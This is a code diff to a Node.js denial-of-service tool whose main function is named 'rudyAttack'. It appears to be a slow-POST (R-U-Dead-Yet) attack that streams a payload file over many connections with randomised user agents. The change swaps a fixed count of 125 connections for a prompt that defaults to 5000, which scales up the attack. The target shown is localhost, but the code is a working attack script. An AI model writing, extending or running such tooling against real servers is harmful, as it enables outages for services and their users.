@@ -2,11 +2,17 @@ const request = require('request')
 const useragent = require('random-useragent')
 const rp = require('request-promise')
 const fs = require('fs')
+const readline = require('readline-promise').default
 
 let stream = fs.createReadStream('payload.txt')
 
 const host = 'http://127.0.0.1:3000'
-const connections = 125
+
+const rlp = readline.createInterface({
+  input: process.stdin,
+  output: process.stdout,
+  terminal: true
+})
 
 function setupStream() {
   stream._read = () => {
@@ -32,10 +38,14 @@ const options = {
 rudyAttack()
 
 function rudyAttack() {
-  for(let i = 0; i < connections; i++) {
-    setupStream()
-    attack()
-  }
+  rlp.questionAsync('How many connections? ').then(c => {
+    const connections = c ? c : 5000
+
+    for(let i = 0; i < connections; i++) {
+      setupStream()
+      attack()
+    }
+  })
 }
 
 function attack() {
